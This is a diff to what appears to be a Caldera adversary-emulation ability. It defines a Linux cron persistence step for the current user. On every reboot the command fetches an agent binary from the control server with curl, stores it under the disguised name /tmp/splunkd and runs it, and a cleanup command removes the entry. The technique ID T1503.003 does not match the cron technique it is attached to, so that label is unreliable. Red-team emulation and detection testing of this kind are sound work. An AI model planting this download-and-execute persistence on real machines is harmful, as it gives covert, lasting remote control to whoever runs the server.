@@ -1,38 +1,40 @@
-- technique_name: 'Scheduled Task/Job: Cron'
+- description: After victim reboots, the host will automatically reach out to the
+    caldera server to download and execute the caldera agent. This creates persistent
+    access even after reboot.
   plugin: ''
-  repeatable: false
-  technique_id: T1503.003
-  singleton: true
   buckets: []
-  additional_info:
-    cleanup: '[]'
-  tactic: persistence
-  privilege: ''
-  name: Create cronjob for current user
-  requirements: []
+  technique_id: T1503.003
   access: {}
+  name: Create persistence cronjob for current user
+  tactic: persistence
+  requirements: []
+  privilege: ''
+  singleton: true
+  repeatable: false
+  delete_payload: true
   executors:
-  - parsers: []
-    timeout: 60
-    language: null
+  - timeout: 60
+    uploads: []
+    cleanup:
+    - (crontab -l | grep -v '@reboot sleep 180 && server="http://#{caldera.server}:8888"')
+      | crontab - && rm /tmp/splunkd
+    platform: linux
+    variations: []
+    name: sh
     payloads: []
-    build_target: null
+    language: null
     command: if crontab -l &> /dev/null; then (crontab -l; echo '@reboot sleep 180
-      && server="http://#{caldera.server}:8888";curl -s -X POST -H "file:sandcat.go"
+      && server="http://#{caldera.server}:8888"; curl -s -X POST -H "file:sandcat.go"
       -H "platform:linux" $server/file/download > /tmp/splunkd;chmod +x /tmp/splunkd;/tmp/./splunkd
       -server $server -group red -v') | crontab -; else echo '@reboot sleep 180 &&
       server="http://#{caldera.server}:8888";curl -s -X POST -H "file:sandcat.go"
       -H "platform:linux" $server/file/download > /tmp/splunkd;chmod +x /tmp/splunkd;/tmp/./splunkd
       -server $server -group red -v' | crontab -; fi
-    code: null
+    build_target: null
+    parsers: []
     additional_info: {}
-    variations: []
-    name: sh
-    cleanup:
-    - (crontab -l | grep -v '@reboot sleep 180 && server="http://#{caldera.server}:8888"')
-      | crontab - && rm /tmp/splunkd
-    uploads: []
-    platform: linux
-  description: Create a cronjob for the current user
-  delete_payload: true
+    code: null
+  technique_name: 'Scheduled Task/Job: Cron'
+  additional_info:
+    cleanup: '[]'
   id: 831d5b9d-7867-4bca-98f5-bc235445614c
